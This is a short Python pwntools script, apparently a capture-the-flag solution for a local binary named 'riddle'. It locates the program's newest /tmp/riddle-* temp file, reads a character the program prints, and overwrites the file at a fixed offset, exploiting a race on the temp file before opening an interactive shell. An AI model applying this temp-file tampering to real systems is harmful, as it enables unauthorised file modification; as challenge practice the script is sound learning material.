from pwn import *
import os
import glob
import time

sh = process('./riddle')
sleep(1)

tmp_file_pattern = '/tmp/riddle-*'
temp_files = []

for _ in range (3):
    temp_files = glob.glob(tmp_file_pattern)
    if temp_files:
        break
    time.sleep(0.05)

if not temp_files:
    log.failure('Failed to find temp files')
    exit()

temp_file = max(temp_files, key=os.path.getctime)
print(f"PARENT: tmpfile is `{temp_file}`")

sh.recvuntil("char '")
char = sh.recvuntil("'", drop=True).decode()
print(f"PARENT: character is `{char}`")

with open(temp_file, 'r+b') as fd:
     fd.seek(0x6f) #offset of the character each time is 0x6f
     fd.write(char.encode())

sh.interactive()
